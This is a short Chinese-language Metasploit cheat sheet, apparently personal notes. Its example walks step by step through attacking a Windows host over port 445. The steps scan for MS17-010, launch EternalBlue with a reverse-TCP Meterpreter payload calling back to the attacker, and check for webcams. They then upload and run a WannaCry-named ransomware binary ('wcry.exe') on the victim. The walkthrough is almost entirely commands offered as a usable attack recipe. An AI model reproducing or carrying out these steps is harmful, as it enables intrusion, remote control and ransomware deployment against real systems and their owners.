# [Home](../README.md)
## [metasploit](https://www.metasploit.com/)

### 基本命令
```shell
# 搜索漏洞模块
search 模块关键字
# 调用漏洞模块
use exploit/模块路径
# 设置攻击目标
# 设置攻击负载
# 设置监听主机


```
### 示例：
```shell
#445端口、ms17-010漏洞实现上传勒索病毒
0.  ping 目标ip											#确定网络连接
1.  nmap -n -p 445 --script smb-vuln-ms17-010 目标ip	#扫描目标是否开启445端口，存在ms17-010漏洞
2.  service postgresql start							#启动postgresql服务
3.  service postgresql status
4.  msfconsole											#启动msfconsole
5.  use exploit/windows/smb/ms17_010_eternalblue		#调用漏洞模块
6.  option												#查看参数
7.  set RHOST 目标ip 									#指定攻击目标
8.  set payload windows/x64/meterpreter/reverse_tcp	#设置攻击负载(攻击载荷是针对特定平台的一段攻击代码，它通过网络传送到攻击目标进行执行)
9.  set LHOST 本机ip									#设置监听主机(发动攻击的主机)
10. show option											#查看配置情况
11. exploit												#发起攻击
12. getuid												#获取系统重要信息
13. webcam_list											#扫描攻击目标是否存在摄像头
14. route												#查询路由
15. upload wcry/wcry.exe c:\ 							#本机木马存放路径 目标存放路径(c:\)
    upload wcry/FILE_ID.DIZ c:\
16. execute -f c:\wcry.exe								#执行木马
    screenshot	
```